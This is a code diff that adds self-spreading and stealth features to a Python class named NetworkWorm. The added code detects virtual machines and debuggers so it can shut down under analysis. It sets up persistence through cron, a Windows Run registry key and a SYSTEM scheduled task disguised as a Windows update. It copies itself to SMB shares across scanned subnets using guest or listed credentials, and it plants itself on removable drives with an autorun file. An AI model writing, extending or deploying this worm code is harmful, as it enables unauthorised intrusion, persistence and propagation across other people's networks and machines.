@@ -15,6 +15,8 @@ import sqlite3
 import shutil
 import win32crypt
 import win32cred
+from smb.SMBConnection import SMBConnection
+from smb.base import OperationFailure
 
 # Configuration
 SCAN_SUBNETS = ["192.168.100.0/24", "10.0.0.0/16"]
@@ -36,6 +38,7 @@ class NetworkWorm:
         self.worm_path = Path(__file__).resolve()
         self.fingerprint = self._generate_fingerprint()
         self.lock = threading.Lock()
+        self.CREDS = CREDS.copy()  # Initialize instance CREDS
         self._setup_logging()
         self._verify_prerequisites()
         self._anti_analysis_thread()
@@ -279,6 +282,135 @@ class NetworkWorm:
                 )
         finally:
             sys.exit(0)
+
+    def _anti_analysis_thread(self):
+        def monitor():
+            while True:
+                if self._detect_analysis():
+                    self._emergency_shutdown()
+                sleep(ANTI_DEBUG_INTERVAL)
+
+        threading.Thread(target=monitor, daemon=True).start()
+
+    def _detect_analysis(self):
+        # Check for common analysis environments
+        analysis_indicators = [
+            "vbox" in sys.modules,
+            "vmware" in (os.getenv('VBOX_INSTALL_PATH', '') + os.getenv('VMWARE_ROOT', '')).lower(),
+            Path("/proc/self/status").read_text().count("TracerPid:") > 0
+        ]
+        return any(analysis_indicators)
+
+    def _kill_previous_instances(self):
+        # Windows: Use mutex; Linux: Use PID file
+        if os.name == 'nt':
+            import win32event
+            self.mutex = win32event.CreateMutex(None, False, f"Global\\{self.fingerprint}")
+            if win32event.GetLastError() == 183:  # Already exists
+                sys.exit(0)
+        else:
+            pid_file = Path(f"/tmp/{self.fingerprint}.pid")
+            if pid_file.exists():
+                try:
+                    old_pid = int(pid_file.read_text())
+                    os.kill(old_pid, 9)
+                except:
+                    pass
+            pid_file.write_text(str(os.getpid()))
+
+    def _cron_persistence(self):
+        cron_entry = f"@reboot {self.worm_path} >/dev/null 2>&1"
+        try:
+            subprocess.run(
+                f'(crontab -l | grep -v "{self.worm_path}"; echo "{cron_entry}") | crontab -',
+                shell=True, check=True
+            )
+        except subprocess.CalledProcessError as e:
+            logging.error(f"Cron persistence failed: {e}")
+
+    def _registry_persistence(self):
+        dest = Path(os.getenv('APPDATA')) / f"Microsoft\\{self.fingerprint}.exe"
+        if not dest.exists():
+            shutil.copy(self.worm_path, dest)
+        subprocess.run(
+            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
+            f'/v "{self.fingerprint}" /t REG_SZ /d "{dest}" /f',
+            shell=True, check=True
+        )
+
+    def _scheduled_task_persistence(self):
+        dest = Path(os.getenv('APPDATA')) / f"Microsoft\\{self.fingerprint}.exe"
+        subprocess.run([
+            'schtasks', '/create', '/tn', f'WindowsUpdate_{self.fingerprint}',
+            '/tr', f'"{dest}"', '/sc', 'ONLOGON', '/ru', 'SYSTEM', '/f'
+        ], check=True)
+
+    def _exploit_network_shares(self):
+
+        for subnet in SCAN_SUBNETS:
+            network = ipaddress.ip_network(subnet, strict=False)
+            for host in network.hosts():
+                ip = str(host)
+                try:
+                    # Try guest/anonymous login first
+                    conn = SMBConnection('', '', 'worm', ip, use_ntlm_v2=True)
+                    connected = conn.connect(ip, 445, timeout=5)
+
+                    if not connected:
+                        # Try with credentials if guest access fails
+                        for user, passwd in self.CREDS:
+                            conn = SMBConnection(user, passwd, 'worm', ip, use_ntlm_v2=True)
+                            if conn.connect(ip, 445, timeout=5):
+                                break
+                        else:
+                            continue  # No valid credentials found
+
+                    shares = conn.listShares()
+                    for share in shares:
+                        if not share.isSpecial and share.name not in ['IPC$', 'print$']:
+                            try:
+                                dest_path = f"/Windows/Temp/{self.fingerprint}.exe"
+                                with open(self.worm_path, 'rb') as file_obj:
+                                    conn.storeFile(share.name, dest_path, file_obj)
+                                logging.info(f"Copied to {ip}/{share.name}")
+                            except OperationFailure:
+                                try:  # Try creating directory structure
+                                    conn.createDirectory(share.name, '/Windows/Temp')
+                                    with open(self.worm_path, 'rb') as file_obj:
+                                        conn.storeFile(share.name, dest_path, file_obj)
+                                except Exception as e:
+                                    logging.error(f"Share error {ip}/{share.name}: {str(e)}")
+
+                    conn.close()
+                except Exception as e:
+                    continue
+
+    def _infect_removable_drives(self):
+        drives = []
+        if os.name == 'nt':
+            drives = [f"{d}:\\" for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if Path(f"{d}:\\").exists()]
+        else:
+            drives = [Path('/media', d) for d in os.listdir('/media') if Path('/media', d).is_mount()]
+
+        for drive in drives:
+            try:
+                dest = Path(drive) / f".{self.fingerprint}"
+                shutil.copy(self.worm_path, dest)
+                if os.name == 'posix':
+                    os.chmod(dest, 0o755)
+                    (Path(drive) / ".autorun.inf").write_text(f"[autorun]\nopen={dest}")
+            except Exception as e:
+                logging.error(f"Removable drive infection failed on {drive}: {e}")
+
+    def _is_infected(self, ip):
+        return Path('.infected_hosts').exists() and ip in Path('.infected_hosts').read_text().splitlines()
+
+    def _mark_infection(self, ip):
+        with open('.infected_hosts', 'a+') as f:
+            f.seek(0)
+            hosts = f.read().splitlines()
+            if ip not in hosts:
+                f.write(f"{ip}\n")
 
 
 if __name__ == "__main__":
